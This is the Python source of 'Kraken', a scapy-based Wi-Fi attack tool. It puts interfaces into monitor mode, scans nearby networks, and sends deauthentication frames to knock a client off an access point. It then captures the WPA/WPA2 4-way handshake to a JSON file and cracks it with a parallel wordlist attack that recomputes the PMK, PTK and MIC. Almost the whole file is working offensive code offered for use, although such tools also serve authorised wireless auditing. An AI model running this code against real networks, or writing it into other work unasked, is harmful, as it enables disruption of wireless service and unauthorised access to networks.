"""
MIT License

Copyright (c) 2025 0xf0xy

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

from scapy.all import (
    sniff,
    Dot11,
    Dot11Beacon,
    Dot11Elt,
    Dot11Deauth,
    EAPOL,
    RadioTap,
    sendp,
    Packet,
)
from concurrent.futures import ProcessPoolExecutor, as_completed
import subprocess
import threading
import hashlib
import time
import hmac
import json
import os

RED = "\033[1;31m"
GREEN = "\033[1;32m"
BLUE = "\033[1;34m"
RESET = "\033[0m"


class Kraken:
    """
    Kraken:
    """

    def __init__(self):
        """
        Initialize Kraken instance.
        """

    @staticmethod
    def PRF512(key: bytes, A: bytes, B: bytes) -> bytes:
        """
        Pseudo-Random Function (PRF) using HMAC-SHA1 to generate a 512-bit key.

        Args:
            key (bytes): The key to use for the PRF.
            A (bytes): The first input to the PRF.
            B (bytes): The second input to the PRF.

        Returns:
            bytes: The derived key (PTK) of length 512 bits.
        """
        blen = 64
        i = 0
        R = b""

        while i <= ((blen * 8 + 159) // 160):
            hmacsha1 = hmac.new(key, A + b"\x00" + B + bytes([i]), hashlib.sha1)
            R += hmacsha1.digest()
            i += 1

        return R[:blen]

    @staticmethod
    def list_interfaces():
        """
        List all available network interfaces.
        """
        os.system("clear")

        try:
            iw_dev = subprocess.check_output(
                ["iw", "dev"], stderr=subprocess.DEVNULL
            ).decode()
            iw_list = subprocess.check_output(
                ["iw", "list"], stderr=subprocess.DEVNULL
            ).decode()
            ip_links = (
                subprocess.check_output(["ip", "-o", "link", "show"])
                .decode()
                .splitlines()
            )

        except Exception as e:
            print(f"    [{RED}x{RESET}] Failed to use 'iw' or 'ip': {e}")

        phy_map = {}

        for block in [b for b in iw_dev.split("\n\n") if b.strip()]:
            lines = [l.strip() for l in block.splitlines() if l.strip()]

            if not lines or not lines[0].startswith("phy#"):
                continue

            phy = lines[0].replace("phy#", "phy")

            for i, l in enumerate(lines):
                if l.startswith("Interface"):
                    iface = l.split()[1]
                    addr = "N/A"
                    itype = "N/A"

                    for j in range(i + 1, len(lines)):
                        if lines[j].startswith("addr "):
                            addr = lines[j].split()[1]

                        if lines[j].startswith("type "):
                            itype = lines[j].split()[1]

                    phy_map.setdefault(phy, []).append(
                        {"iface": iface, "addr": addr, "type": itype}
                    )

        monitor_phys = set()

        for block in [b for b in iw_list.split("Wiphy ") if b.strip()]:
            header = block.splitlines()[0].strip()
            phy = header if header.startswith("phy") else f"phy{header}"

            if "Supported interface modes:" in block and "* monitor" in block:
                monitor_phys.add(phy)

        rows = []

        for phy, ifaces in phy_map.items():
            supports = phy in monitor_phys

            for info in ifaces:
                iface = info["iface"]
                addr = info["addr"].upper()
                cur_type = info["type"]
                state = (
                    "UP"
                    if any(iface in l and "state UP" in l for l in ip_links)
                    else "DOWN"
                )
                rows.append(
                    {
                        "iface": iface,
                        "phy": phy,
                        "mac": addr,
                        "mode": cur_type,
                        "state": state,
                        "monitor_capable": supports,
                    }
                )

        print(
            f" {'IFACE':7} | {'PHY':4} | {'MODE':8} | {'STATE':6} | {'MAC':17} | SUPPORT"
        )
        print("─" * 80)

        for r in rows:
            support = (
                f"{GREEN}Yes{RESET}" if r["monitor_capable"] else f"{RED}No{RESET}"
            )
            mode_color = (
                f"{BLUE}{r['mode']}{RESET}" if r["mode"] == "monitor" else r["mode"]
            )
            print(
                f" {r['iface']:<7} | {r['phy']:<4} | {mode_color:<8} | {r['state']:<6} | {r['mac']:<17} | {support}"
            )

        print("─" * 80)
        print("\nUse 'sudo kraken start/stop <iface>' to enable/disable monitor mode.")

    @staticmethod
    def start_monitor(iface: str):
        """
        Start monitor mode on the specified interface.

        Args:
            iface (str): Network interface to set to monitor mode.
        """
        os.system("clear")

        print(f"Enabling monitor mode on interface {BLUE}{iface}{RESET}")
        print("─" * 50)

        try:
            subprocess.run(["systemctl", "stop", "NetworkManager"], check=False)
            subprocess.run(["systemctl", "stop", "wpa_supplicant"], check=False)
            subprocess.run(["ip", "link", "set", iface, "down"], check=True)
            subprocess.run(["iw", iface, "set", "type", "monitor"], check=True)
            subprocess.run(["ip", "link", "set", iface, "up"], check=True)

            print(
                f"    [{GREEN}✓{RESET}] Interface {iface} is now in {GREEN}monitor{RESET} mode.\n"
            )

        except subprocess.CalledProcessError:
            print(f"    [{RED}x{RESET}] Failed to change interface {iface} mode.\n")

    @staticmethod
    def stop_monitor(iface: str):
        """
        Stop monitor mode on the specified interface.

        Args:
            iface (str): Network interface to stop monitor mode on.
        """
        os.system("clear")

        print(f"Disabling monitor mode on interface {BLUE}{iface}{RESET}")
        print("─" * 50)
        try:
            subprocess.run(["ip", "link", "set", iface, "down"], check=True)
            subprocess.run(["iw", iface, "set", "type", "managed"], check=True)
            subprocess.run(["ip", "link", "set", iface, "up"], check=True)
            subprocess.run(["systemctl", "start", "wpa_supplicant"], check=False)
            subprocess.run(["systemctl", "start", "NetworkManager"], check=False)

            print(
                f"    [{GREEN}✓{RESET}] Interface {iface} is now in {GREEN}managed{RESET} mode.\n"
            )

        except subprocess.CalledProcessError:
            print(f"    [{RED}x{RESET}] Failed to change interface {iface} mode.\n")

    @staticmethod
    def channel_hopper(iface: str, delay: int) -> threading.Event:
        """
        Change the network interface channel periodically.

        Args:
            iface (str): Network interface to change channels on.
            delay (float): Delay between channel changes in seconds.

        Returns:
            threading.Event: Event to stop the channel hopping.
        """
        stop_event = threading.Event()

        def hop():
            """
            Function to change channels periodically.
            """
            while not stop_event.is_set():
                for ch in list(range(1, 14)):
                    if stop_event.is_set():
                        break

                    subprocess.run(
                        ["iw", iface, "set", "channel", str(ch)],
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL,
                    )
                    time.sleep(delay)

        thread = threading.Thread(target=hop, daemon=True)
        thread.start()

        return stop_event

    @staticmethod
    def get_encryption(pkt: Packet) -> str:
        """
        Get the encryption type of a Wi-Fi packet.

        Args:
            pkt (Packet): Scapy packet containing Wi-Fi information.

        Returns:
            str: Encryption type (WEP, WPA, WPA2, Open).
        """
        if pkt.haslayer(Dot11Elt):
            elt = pkt.getlayer(Dot11Elt)

            while elt:
                if elt.ID == 48:
                    if b"\x00\x0f\xac\x04" in elt.info:
                        return "WPA2"

                if elt.ID == 221 and elt.info.startswith(b"\x00\x50\xf2\x01"):
                    return "WPA"

                elt = elt.payload.getlayer(Dot11Elt)

            return "WEP"

        else:
            return "Open"

    @staticmethod
    def display_info(mode: str, data: dict, bssid: str = None, channel: int = None):
        """
        Print the discovered Wi-Fi networks in a formatted table. If in handshake mode,
        print the captured handshake information in a formatted table.

        Args:
            mode (str): Mode of operation, either "scan" or "handshake".
            data (dict): Dictionary containing network or handshake information.
            bssid (str): BSSID of the target access point.
            channel (int): Channel of the target access point.
        """
        os.system("clear")

        if mode == "scan":
            print(
                " ESSID                     | BSSID             | ENC   | CH  | PWR   | BEAC"
            )
            print("─" * 75)

            for bssid, info in data.items():
                ssid = info["ssid"] if info["ssid"] else "<hidden>"
                print(
                    f" {ssid:25} | {bssid} | {info['encryption']:<5} | {info['channel']:<3} | {info['signal']:<5} | {info['beacons']:<6} "
                )

            print("─" * 75)

        elif mode == "handshake":
            handshake = data

            print(f"BSSID     : {bssid.upper()}")
            print(f"Channel   : {channel}")
            print("─" * 45)
            print("EAPOL Packets:")
            print(
                (
                    f"   • [{GREEN}✓{RESET}]"
                    if handshake.get("ANonce")
                    else f"   • [{RED}x{RESET}]"
                ),
                "Packet 1 (ANonce)",
            )
            print(
                (
                    f"   • [{GREEN}✓{RESET}]"
                    if handshake.get("SNonce")
                    else f"   • [{RED}x{RESET}]"
                ),
                "Packet 2 (SNonce)",
            )
            print(
                (
                    f"   • [{GREEN}✓{RESET}]"
                    if handshake.get("MIC")
                    else f"   • [{RED}x{RESET}]"
                ),
                "Packet 3 (MIC)",
            )
            print(
                (
                    f"   • [{GREEN}✓{RESET}]"
                    if handshake.get("EAPOL")
                    else f"   • [{RED}x{RESET}]"
                ),
                "Packet 4 (Full Frame)",
            )

            if all(handshake.get(k) for k in ["ANonce", "SNonce", "MIC", "EAPOL"]):
                print(f"\n{GREEN}Valid 4-Way Handshake Captured!{RESET}")

            else:
                print("\nAwaiting handshake packets... Try a deauth.")

    def check_password(
        self,
        password: str,
        ssid: bytes,
        ap: bytes,
        client: bytes,
        anonce: bytes,
        snonce: bytes,
        mic: bytes,
        eapol: bytes,
    ) -> bool:
        """
        Check if the provided password matches the MIC.

        Args:
            password (str): Password to test.
            ssid (bytes): SSID of the network.
            ap (bytes): BSSID of the access point.
            client (bytes): MAC address of the client.
            anonce (bytes): ANonce from the handshake.
            snonce (bytes): SNonce from the handshake.
            mic (bytes): MIC from the handshake.
            eapol (bytes): EAPOL packet from the handshake.

        Returns:
            bool: Password if the MIC matches, False otherwise.
        """
        pmk = hashlib.pbkdf2_hmac("sha1", password.encode(), ssid, 4096, 32)

        A = b"Pairwise key expansion"
        B = (
            min(ap, client)
            + max(ap, client)
            + min(anonce, snonce)
            + max(anonce, snonce)
        )
        ptk = self.PRF512(pmk, A, B)
        mic_key = ptk[:16]
        eapol_zeroed = bytearray(eapol)
        eapol_zeroed[81:97] = b"\x00" * 16
        new_mic = hmac.new(mic_key, eapol_zeroed, hashlib.sha1).digest()[:16]

        if new_mic == mic:
            return password

        return False

    def deauth(self, iface: str, target_bssid: str, client: str, pkts: int):
        """
        Send deauthentication packets to a target client or broadcast.

        Args:
            iface (str): Network interface to send packets on.
            target_bssid (str): BSSID of the target access point.
            client (str): MAC address of the target client.
            pkts (int): Number of deauth packets to send.
        """
        os.system("clear")

        def handler(pkt: Packet) -> bool:
            if pkt.haslayer(Dot11Beacon):
                if (
                    pkt.addr1.lower() == client.lower()
                    and pkt.addr2.lower() == target_bssid.lower()
                ):
                    return True

            return False

        print(f"Waiting for beacon frame...", end="\r", flush=True)

        if not sniff(iface=iface, stop_filter=handler, timeout=5):
            print(
                f"[{RED}x{RESET}] No beacon frame received for: {target_bssid.upper()}"
            )

            return

        print(f"Sending Deauth to: {client.upper()} on AP: {target_bssid.upper()}")
        print("─" * 65)

        dot11 = Dot11(
            type=0,
            subtype=12,
            addr1=client,
            addr2=target_bssid,
            addr3=target_bssid,
        )
        pkt = RadioTap() / dot11 / Dot11Deauth(reason=7)

        for i in range(1, pkts + 1):
            sendp(pkt, iface=iface, verbose=0)
            print(f"   → Sent {i}/{pkts} deauth packets", end="\r", flush=True)

        print(f"\n\n{GREEN}Deauth attack complete.{RESET}")

    def dump_networks(self, iface: str, target_bssid: str = None, channel: int = None):
        """
        Sniff Wi-Fi networks and display their details. If a target BSSID and channel are provided,
        it will sniff for WPA/WPA2 handshakes.

        Args:
            iface (str): Network interface to sniff on.
            target_bssid (str): BSSID of the target access point.
            channel (int): Channel to monitor for handshakes.
        """
        if target_bssid and channel:
            handshake = {}

            subprocess.run(
                ["iw", iface, "set", "channel", str(channel)],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            def handshake_handler(pkt: Packet):
                updated = False

                if (
                    pkt.haslayer(Dot11Beacon)
                    and not handshake.get("SSID")
                    and pkt.addr2 == target_bssid
                ):
                    ssid = pkt[Dot11Elt].info.decode("utf-8", errors="ignore")
                    handshake["SSID"] = ssid if ssid else "<hidden>"
                    updated = True

                elif pkt.haslayer(EAPOL):
                    src = pkt.addr2 if pkt.addr2 else ""
                    dst = pkt.addr1 if pkt.addr1 else ""

                    if target_bssid not in [src, dst]:
                        return

                    try:
                        raw = bytes(pkt.getlayer(EAPOL))

                    except:
                        return

                    if src == target_bssid and not handshake.get("ANonce"):
                        handshake["AP"] = src
                        handshake["Client"] = dst
                        handshake["ANonce"] = raw.hex()[34:98]
                        updated = True

                    elif (
                        dst == target_bssid
                        and src == handshake.get("Client")
                        and handshake.get("ANonce")
                        and not handshake.get("SNonce")
                    ):
                        handshake["SNonce"] = raw.hex()[34:98]
                        handshake["MIC"] = raw.hex()[162:194]
                        handshake["EAPOL"] = raw.hex()
                        updated = True

                if updated:
                    self.display_info(
                        "handshake", handshake, bssid=target_bssid, channel=channel
                    )

            sniff(
                iface=iface,
                prn=handshake_handler,
                stop_filter=lambda pkt: all(
                    handshake.get(k) for k in ["ANonce", "SNonce", "MIC", "EAPOL"]
                ),
            )

            with open("handshake.json", "w") as f:
                json.dump(handshake, f, indent=2)

        else:
            networks = {}

            def handler(pkt: Packet):
                if pkt.haslayer(Dot11Beacon):
                    bssid = pkt[Dot11].addr2.upper()
                    ssid = (
                        pkt[Dot11Elt].info.decode(errors="ignore")
                        if pkt.haslayer(Dot11Elt)
                        else ""
                    )

                    try:
                        dbm_signal = pkt.dBm_AntSignal

                    except:
                        dbm_signal = "N/A"

                    channel = None
                    elt = pkt.getlayer(Dot11Elt)

                    while elt:
                        if elt.ID == 3:
                            channel = elt.info[0]
                            break

                        elt = elt.payload.getlayer(Dot11Elt)

                    encryption = self.get_encryption(pkt)

                    if bssid not in networks:
                        networks[bssid] = {
                            "ssid": ssid,
                            "signal": dbm_signal,
                            "channel": channel if channel else "-",
                            "encryption": encryption,
                            "beacons": 1,
                        }

                    else:
                        networks[bssid]["signal"] = dbm_signal
                        networks[bssid]["beacons"] += 1

                    self.display_info("scan", networks)

            self.channel_hopper(iface, 0.25)
            sniff(iface=iface, prn=handler)

    def crack_handshake(self, wordlist: str, handshake: str):
        """
        Crack WPA/WPA2 handshake using a wordlist.

        Args:
            wordlist (str): Path to the wordlist file.
            handshake (str): Path to the handshake file.
        """
        os.system("clear")

        with open(handshake, "r") as f:
            handshake_info = json.load(f)

        SSID = handshake_info["SSID"].encode("utf-8")
        AP = bytes.fromhex(handshake_info["AP"].replace(":", ""))
        Client = bytes.fromhex(handshake_info["Client"].replace(":", ""))
        ANonce = bytes.fromhex(handshake_info["ANonce"])
        SNonce = bytes.fromhex(handshake_info["SNonce"])
        MIC = bytes.fromhex(handshake_info["MIC"])
        EAPOL = bytes.fromhex(handshake_info["EAPOL"])

        with open(wordlist, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]

        print(f"Target     : {handshake_info['SSID']} ({handshake_info['AP'].upper()})")
        print(f"Wordlist   : {wordlist}")
        print("─" * 50)

        found = None
        start = time.time()
        keys_tested = 0

        with ProcessPoolExecutor() as executor:
            futures = {
                executor.submit(
                    self.check_password,
                    pwd,
                    SSID,
                    AP,
                    Client,
                    ANonce,
                    SNonce,
                    MIC,
                    EAPOL,
                ): pwd
                for pwd in passwords
            }

            for future in as_completed(futures):
                pwd = futures[future]
                result = future.result()
                keys_tested += 1
                elapsed = time.time() - start
                speed = keys_tested / elapsed if elapsed > 0 else 0

                print(f"\n    Testing    : {pwd}")
                print(f"\n    Keys tried : {keys_tested}")
                print(f"    Speed      : {int(speed)} keys/sec")
                print(
                    f"    Elapsed    : {time.strftime('%H:%M:%S', time.gmtime(elapsed))}\n"
                )
                print("\033[F\033[K" * 7, end="")
                time.sleep(0.1)

                if result:
                    found = result
                    break

        if found:
            print(f"\n[{GREEN}✓{RESET}] Key Found! → {GREEN}{found}{RESET}")
            print(
                f"\n    Elapsed    : {time.strftime('%H:%M:%S', time.gmtime(elapsed))}"
            )

        else:
            print(f"\n    [{RED}x{RESET}] No Key Found.")
